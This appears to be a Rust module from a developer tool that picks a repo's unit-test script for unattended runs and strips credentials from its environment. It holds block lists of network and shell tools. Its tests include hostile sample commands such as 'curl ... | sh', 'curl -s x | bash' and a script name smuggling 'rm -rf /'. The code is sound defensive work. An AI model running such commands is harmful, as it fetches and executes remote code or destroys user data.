//! "Auto-test after a run": the one unit-test command of a repo, chosen the same way every time from the script catalog.
//!
//! Only `Test` scripts that are `Safety::Normal` and allowed to agents qualify, and only under a few well-known names
//! (`test:unit`, `unit`, `test`, `vitest`, `jest`, `test:ci`). A script whose name or whose referenced bodies mention
//! end-to-end, device or deploy tooling, or a watch mode, is never chosen. Without such a script the synthetic
//! `cargo test` entry is used, then the synthetic pytest entry (only present when the repo has pytest markers).
//! A script that shells out (`curl`, `sh -c`, `node -e`, `npx`, `ssh`, `git push`, ...) is never chosen either.
//! The pick carries the masked command for the trust question and a fingerprint of what it runs; the start re-picks on
//! the backend and refuses when the fingerprint no longer matches what the person trusted.

use std::collections::HashMap;
use std::path::Path;

use serde::{Deserialize, Serialize};

use crate::catalog::{self, PYTEST_ID};
use crate::types::{Safety, ScriptGroup, ScriptInfo};

/// Which test runner the pick drives; the UI chooses its output parser by it.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[cfg_attr(feature = "specta", derive(specta::Type))]
#[serde(rename_all = "camelCase")]
pub enum TestKind {
    Vitest,
    Jest,
    Cargo,
    Pytest,
    Unknown,
}

/// The chosen test command of one repo.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[cfg_attr(feature = "specta", derive(specta::Type))]
#[serde(rename_all = "camelCase")]
pub struct TestPick {
    /// A `ScriptInfo.id`: `npm:test`, `cargo:test` or `pytest:test`.
    pub script: String,
    /// What is executed, safe to show (`npm run test`), never the body.
    pub runner: String,
    pub kind: TestKind,
    /// The command the runner executes (the script body for npm), masked like the Run panel's "Show command".
    pub command: String,
    /// A hash of the script id, the runner and every body it runs; changes when the repository changes what runs.
    pub fingerprint: String,
}

/// npm script names that may be picked, best first.
const PREFERRED: [&str; 12] = ["test:unit", "test-unit", "test_unit", "unit", "unit:test", "test", "tests", "vitest", "jest", "test:ci", "test-ci", "ci:test"];

/// Words (of the name or of any body the script runs) that rule a script out: end-to-end, browser, device, deploy and
/// long-running tooling. `watch` and `watchall` also cover `--watch` / `--watchAll`.
const NEVER: [&str; 36] = [
    "e2e", "cypress", "playwright", "detox", "maestro", "appium", "lambdatest", "browserstack", "saucelabs", "wdio", "webdriverio", "webdriver", "selenium", "puppeteer",
    "nightwatch", "testcafe", "integration", "emulator", "simulator", "xcodebuild", "gradlew", "adb", "deploy", "publish", "release", "upload", "ship", "docker",
    "podman", "compose", "watch", "watchall", "nodemon", "k6", "artillery", "kubectl",
];

/// Programs (a command word, also as a path like `/usr/bin/curl`) that rule a script out: network, remote, package
/// runners that fetch and run code, privilege changes.
const NEVER_PROGRAM: [&str; 16] = ["curl", "wget", "ssh", "scp", "sftp", "rsync", "nc", "ncat", "netcat", "npx", "bunx", "sudo", "doas", "eval", "docker", "podman"];

/// Word pairs that rule a script out: an inline shell or interpreter, a package runner, a push.
const NEVER_PAIR: [(&[&str], &[&str]); 6] = [
    (&["sh", "bash", "zsh", "dash", "ksh", "fish"], &["-c"]),
    (&["node", "deno", "bun"], &["-e", "--eval", "-p", "--print"]),
    (&["python", "python3", "perl", "ruby"], &["-c", "-e"]),
    (&["pnpm", "yarn"], &["dlx"]),
    (&["npm"], &["exec", "x"]),
    (&["git"], &["push"]),
];

/// Whether a command line (one or more script bodies) shells out in a way auto-test must never start by itself.
pub fn shells_out(text: &str) -> bool {
    let w: Vec<String> = catalog::command_words(text).into_iter().map(|w| w.rsplit(['/', '\\']).next().unwrap_or_default().to_owned()).collect();
    if w.iter().any(|x| NEVER_PROGRAM.contains(&x.as_str())) {
        return true;
    }
    w.windows(2).any(|p| NEVER_PAIR.iter().any(|(a, b)| a.contains(&p[0].as_str()) && b.contains(&p[1].as_str())))
}

/// Text that rules a script out: the `npm init` placeholder (it only fails), the Vitest UI server, servers started for
/// browser tests.
const NEVER_TEXT: [&str; 4] = ["no test specified", "--ui", "start-server-and-test", "wait-on"];

/// The unit-test command of the repo at `repo`, or `None` when nothing safe qualifies.
pub fn pick(repo: &Path) -> Option<TestPick> {
    let cat = catalog::catalog("", repo).ok()?;
    let usable = |s: &&ScriptInfo| s.group == ScriptGroup::Test && s.safety == Safety::Normal && !s.forbidden_to_agents;
    let candidates: Vec<&ScriptInfo> = cat.scripts.iter().filter(usable).collect();
    if let Some(p) = pick_npm(repo, &candidates) {
        return Some(p);
    }
    let synthetic = |id: &str, kind: TestKind| candidates.iter().find(|s| s.id == id).map(|s| finish(repo, &s.id, &s.runner, kind, &s.runner));
    synthetic("cargo:test", TestKind::Cargo).or_else(|| synthetic(PYTEST_ID, TestKind::Pytest))
}

fn finish(repo: &Path, script: &str, runner: &str, kind: TestKind, ran: &str) -> TestPick {
    // an npm script's body (masked); cargo and pytest run exactly what the runner says
    let command = if script.starts_with("npm:") { catalog::display_command(repo, script).unwrap_or_else(|_| runner.to_owned()) } else { runner.to_owned() };
    TestPick { script: script.to_owned(), runner: runner.to_owned(), kind, command, fingerprint: fingerprint(&[script, runner, ran]) }
}

/// FNV-1a over the parts, as 16 hex digits: stable across builds and platforms (it is stored in settings.json).
fn fingerprint(parts: &[&str]) -> String {
    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
    for p in parts {
        for b in p.bytes().chain(std::iter::once(0)) {
            h ^= u64::from(b);
            h = h.wrapping_mul(0x0000_0100_0000_01b3);
        }
    }
    format!("{h:016x}")
}

/// Variables an unattended test process gets: what a toolchain needs to find itself and a locale, nothing else.
/// The same allow-list as the agents' processes: no `SSH_AUTH_SOCK`, no tokens, no cloud credentials.
const UNATTENDED_ENV: [&str; 13] = ["PATH", "HOME", "USER", "LOGNAME", "SHELL", "TERM", "TMPDIR", "LANG", "NVM_DIR", "NODE_EXTRA_CA_CERTS", "SSL_CERT_FILE", "SSL_CERT_DIR", "CARGO_HOME"];

/// The whole environment of an auto-test process (the process is started with an empty environment plus this): the
/// allow-listed variables of the IDE process, overlaid with the login shell's (`login`), and on Windows the system
/// variables a toolchain needs. Never a variable that is not on the list.
pub fn unattended_env(login: &HashMap<String, String>) -> HashMap<String, String> {
    let keep = |k: &str| -> Option<String> {
        if cfg!(windows) {
            if let Some(n) = intely_core::env::windows_env_name(k) {
                return Some(n.to_owned());
            }
        }
        (UNATTENDED_ENV.contains(&k) || k.starts_with("LC_") || k == "RUSTUP_HOME").then(|| k.to_owned())
    };
    let mut out = HashMap::new();
    for (k, v) in std::env::vars_os().filter_map(|(k, v)| Some((k.into_string().ok()?, v.into_string().ok()?))).chain(login.iter().map(|(k, v)| (k.clone(), v.clone()))) {
        if let Some(name) = keep(&k) {
            out.insert(name, v);
        }
    }
    out
}

fn pick_npm(repo: &Path, candidates: &[&ScriptInfo]) -> Option<TestPick> {
    let npm: Vec<&ScriptInfo> = candidates.iter().copied().filter(|s| s.source == "npm").collect();
    if npm.is_empty() {
        return None;
    }
    let (_, scripts, _) = catalog::load(repo).ok()?;
    for name in PREFERRED {
        let id = format!("npm:{name}");
        let Some(info) = npm.iter().find(|s| s.id == id) else { continue };
        let all = catalog::closure(name, &scripts);
        let lower = all.to_ascii_lowercase();
        if NEVER_TEXT.iter().any(|t| lower.contains(t)) || catalog::words(name).iter().chain(catalog::words(&all).iter()).any(|w| NEVER.contains(&w.as_str())) || shells_out(&all) {
            continue;
        }
        return Some(finish(repo, &info.id, &info.runner, kind_of(&all), &all));
    }
    None
}

fn kind_of(closure_text: &str) -> TestKind {
    let w = catalog::words(closure_text);
    let has = |x: &str| w.iter().any(|y| y == x);
    let lower = closure_text.to_ascii_lowercase();
    if has("vitest") {
        TestKind::Vitest
    } else if has("jest") || lower.contains("react-scripts test") || lower.contains("craco test") {
        TestKind::Jest
    } else {
        TestKind::Unknown
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn repo(files: &[(&str, &str)]) -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        for (name, body) in files {
            let path = dir.path().join(name);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, body).unwrap();
        }
        dir
    }

    fn pkg(scripts: &str) -> String {
        format!(r#"{{"name":"fx","version":"1.0.0","scripts":{{{scripts}}}}}"#)
    }

    fn picked(files: &[(&str, &str)]) -> Option<TestPick> {
        let dir = repo(files);
        pick(dir.path())
    }

    /// Script, runner and kind of a pick (the command and the fingerprint are tested on their own).
    fn srk(p: &TestPick) -> (&str, &str, TestKind) {
        (p.script.as_str(), p.runner.as_str(), p.kind)
    }

    #[test]
    fn prefers_the_unit_script_and_detects_the_runner() {
        let p = picked(&[("package.json", &pkg(r#""test":"vitest","test:unit":"vitest run src","test:e2e":"playwright test""#)), ("pnpm-lock.yaml", "")]).unwrap();
        assert_eq!(srk(&p), ("npm:test:unit", "pnpm run test:unit", TestKind::Vitest));
        assert_eq!(p.command, "vitest run src", "the trust question names what runs");
        let p = picked(&[("package.json", &pkg(r#""test":"jest --passWithNoTests","lint":"eslint .""#))]).unwrap();
        assert_eq!((p.script.as_str(), p.kind), ("npm:test", TestKind::Jest));
        // React Native: jest through the test script (the preset lives in the jest config)
        let p = picked(&[("package.json", &pkg(r#""android":"react-native run-android","ios":"react-native run-ios","start":"react-native start","test":"jest""#))]).unwrap();
        assert_eq!((p.script.as_str(), p.runner.as_str(), p.kind), ("npm:test", "npm run test", TestKind::Jest));
        // a referenced script decides the runner, CRA counts as jest, anything else is unknown
        let p = picked(&[("package.json", &pkg(r#""test":"npm run unit","unit":"vitest run""#))]).unwrap();
        assert_eq!((p.script.as_str(), p.kind), ("npm:unit", TestKind::Vitest), "unit comes before test");
        assert_eq!(picked(&[("package.json", &pkg(r#""test":"react-scripts test""#))]).unwrap().kind, TestKind::Jest);
        assert_eq!(picked(&[("package.json", &pkg(r#""test":"mocha 'src/**/*.spec.js'""#))]).unwrap().kind, TestKind::Unknown);
        assert_eq!(picked(&[("package.json", &pkg(r#""test":"node --test""#))]).unwrap().kind, TestKind::Unknown);
        // a backend's own server tests are unit tests too
        assert_eq!(picked(&[("package.json", &pkg(r#""test":"jest tests/server""#))]).unwrap().kind, TestKind::Jest);
    }

    #[test]
    fn the_choice_is_the_same_every_time() {
        let dir = repo(&[("package.json", &pkg(r#""jest":"jest","vitest":"vitest run","test:ci":"jest --ci","tests":"vitest run""#))]);
        let first = pick(dir.path()).unwrap();
        assert_eq!(first.script, "npm:tests");
        for _ in 0..5 {
            assert_eq!(pick(dir.path()).unwrap(), first);
        }
    }

    #[test]
    fn never_picks_end_to_end_device_or_watch_scripts() {
        for scripts in [
            r#""test":"cypress run""#,
            r#""test":"playwright test""#,
            r#""test":"detox test -c ios.sim.release""#,
            r#""test":"maestro test flows/""#,
            r#""test":"wdio run wdio.conf.js""#,
            r#""test":"jest --config jest.integration.js""#,
            r#""test":"jest --watch""#,
            r#""test":"jest --watchAll""#,
            r#""test":"vitest --ui""#,
            r#""test:watch":"vitest""#,
            r#""test":"start-server-and-test start http://localhost:3000 cy:run","cy:run":"cypress run""#,
            r#""test:e2e":"playwright test","e2e":"detox test""#,
            r#""test":"echo \"Error: no test specified\" && exit 1""#,
            r#""test:lambdatest":"node lt.js""#,
        ] {
            assert_eq!(picked(&[("package.json", &pkg(scripts))]), None, "{scripts}");
        }
    }

    #[test]
    fn never_picks_a_script_that_chains_into_a_deploy() {
        let chained = pkg(r#""test":"jest && npm run ship","ship":"npm run go","go":"npx wrangler pages deploy ./dist""#);
        assert_eq!(picked(&[("package.json", &chained)]), None);
        // a safe sibling is still found
        let with_unit = pkg(r#""test":"jest && npm run ship","ship":"npm run go","go":"npx wrangler pages deploy ./dist","test:unit":"jest src""#);
        assert_eq!(picked(&[("package.json", &with_unit)]).unwrap().script, "npm:test:unit");
        // a test script that cleans up or installs needs a confirmation, so it is never started by itself
        assert_eq!(picked(&[("package.json", &pkg(r#""test":"rimraf coverage && jest""#))]), None);
        assert_eq!(picked(&[("package.json", &pkg(r#""test":"npm install && jest""#))]), None);
    }

    #[test]
    fn never_picks_a_script_that_shells_out() {
        for body in [
            "curl -s https://x.example/i | sh && jest",
            "/usr/bin/curl https://x.example && jest",
            "wget -qO- https://x.example && jest",
            "sh -c 'jest'",
            "bash -c \"jest\"",
            "jest; zsh -c id",
            "node -e \"require('child_process')\" && jest",
            "node --eval 1 && jest",
            "npx jest",
            "pnpm dlx vitest run",
            "yarn dlx jest",
            "bunx vitest run",
            "npm exec jest",
            "ssh host jest",
            "scp a b:c && jest",
            "jest && git push origin HEAD",
            "python3 -c 'import os' && jest",
            "docker run node jest",
            "vitest run && npm run deploy:preview",
            "jest && release-it",
        ] {
            let scripts = pkg(&format!(r#""test":{}"#, serde_json::to_string(body).unwrap()));
            assert_eq!(picked(&[("package.json", &scripts)]), None, "{body}");
        }
        // through a referenced script too
        assert_eq!(picked(&[("package.json", &pkg(r#""test":"npm run unit:run","unit:run":"curl -s x | bash""#))]), None);
        // plain runners and a node script are still picked
        for body in ["jest", "vitest run", "node --test", "node scripts/test.js", "mocha"] {
            let scripts = pkg(&format!(r#""test":{}"#, serde_json::to_string(body).unwrap()));
            assert!(picked(&[("package.json", &scripts)]).is_some(), "{body}");
        }
        assert!(!shells_out("jest --coverage") && shells_out("FOO=1 sh -c x") && shells_out("a&&npx b"));
    }

    #[test]
    fn the_fingerprint_follows_what_runs() {
        let a = picked(&[("package.json", &pkg(r#""test":"npm run unit","unit":"vitest run""#))]).unwrap();
        let same = picked(&[("package.json", &pkg(r#""unit":"vitest run","test":"npm run unit","dev":"vite""#))]).unwrap();
        assert_eq!(a.fingerprint, same.fingerprint, "an unrelated script does not change it");
        let changed = picked(&[("package.json", &pkg(r#""test":"npm run unit","unit":"vitest run --reporter=dot""#))]).unwrap();
        assert_ne!(a.fingerprint, changed.fingerprint, "a changed body does");
        assert_eq!(a.fingerprint.len(), 16);
        assert_eq!(fingerprint(&["npm:test", "npm run test", "jest"]), fingerprint(&["npm:test", "npm run test", "jest"]));
        assert_ne!(fingerprint(&["ab", "c"]), fingerprint(&["a", "bc"]));
    }

    #[test]
    fn the_unattended_environment_keeps_only_the_allow_list() {
        let login: HashMap<String, String> = [("PATH", "/login/bin"), ("SSH_AUTH_SOCK", "/tmp/agent"), ("GITHUB_TOKEN", "ghp_x"), ("AWS_SECRET_ACCESS_KEY", "k"), ("NPM_TOKEN", "n"), ("LC_ALL", "C"), ("HOME", "/h")]
            .into_iter()
            .map(|(k, v)| (k.to_owned(), v.to_owned()))
            .collect();
        let env = unattended_env(&login);
        assert_eq!(env.get("PATH").map(String::as_str), Some("/login/bin"), "the login shell's PATH wins");
        assert_eq!(env.get("HOME").map(String::as_str), Some("/h"));
        assert_eq!(env.get("LC_ALL").map(String::as_str), Some("C"));
        for k in ["SSH_AUTH_SOCK", "GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY", "NPM_TOKEN", "CI"] {
            assert!(!env.contains_key(k), "{k}");
        }
        assert!(env.keys().all(|k| UNATTENDED_ENV.contains(&k.as_str()) || k.starts_with("LC_") || k == "RUSTUP_HOME" || cfg!(windows)));
    }

    #[test]
    fn falls_back_to_cargo_then_pytest() {
        let p = picked(&[("Cargo.toml", "[package]\nname=\"x\"\n")]).unwrap();
        assert_eq!(srk(&p), ("cargo:test", "cargo test", TestKind::Cargo));
        assert_eq!(p.command, "cargo test");
        let p = picked(&[("package.json", &pkg(r#""dev":"vite","build":"vite build""#)), ("src-tauri/Cargo.toml", "[package]\nname=\"x\"\n")]).unwrap();
        assert_eq!((p.script.as_str(), p.runner.as_str(), p.command.as_str()), ("cargo:test", "cargo test --manifest-path src-tauri/Cargo.toml", "cargo test --manifest-path src-tauri/Cargo.toml"));
        // npm wins over cargo when it has a unit-test script
        let p = picked(&[("package.json", &pkg(r#""test":"vitest run""#)), ("src-tauri/Cargo.toml", "[package]\nname=\"x\"\n")]).unwrap();
        assert_eq!(p.script, "npm:test");
        for marker in [("pytest.ini", "[pytest]\n"), ("conftest.py", "import pytest\n"), ("pyproject.toml", "[project]\nname='x'\n[tool.pytest.ini_options]\n")] {
            let p = picked(&[marker, ("app.py", "x = 1\n")]).unwrap();
            assert_eq!(srk(&p), (PYTEST_ID, "python3 -m pytest -q", TestKind::Pytest), "{}", marker.0);
        }
        assert_eq!(picked(&[("app.py", "x = 1\n"), ("pyproject.toml", "[project]\nname='x'\n")]), None, "python without pytest markers");
        assert_eq!(picked(&[("tests/conftest.py", "")]), None, "only a conftest.py at the root counts");
    }

    #[test]
    fn hostile_or_empty_repos_give_nothing() {
        assert_eq!(picked(&[]), None);
        assert_eq!(picked(&[("package.json", "{nope")]), None);
        assert_eq!(picked(&[("package.json", &pkg(r#""dev":"vite""#))]), None);
        assert_eq!(picked(&[("package.json", &pkg(r#""test:e2e":"playwright test","test:integration":"jest -c int.js""#))]), None, "e2e-only repo");
        let mut big = pkg(r#""test":"vitest run""#);
        big.push_str(&" ".repeat(2 * 1024 * 1024 + 10));
        assert_eq!(picked(&[("package.json", &big)]), None, "a package.json over 2 MB is not read");
        // a script name with odd characters is never picked (only the fixed names are)
        assert_eq!(picked(&[("package.json", &pkg(r#""test; rm -rf /":"jest""#))]), None);
        // a huge pyproject is not read
        let huge = format!("[project]\n{}\n[tool.pytest.ini_options]\n", "#".repeat(600 * 1024));
        assert_eq!(picked(&[("pyproject.toml", &huge)]), None);
    }
}
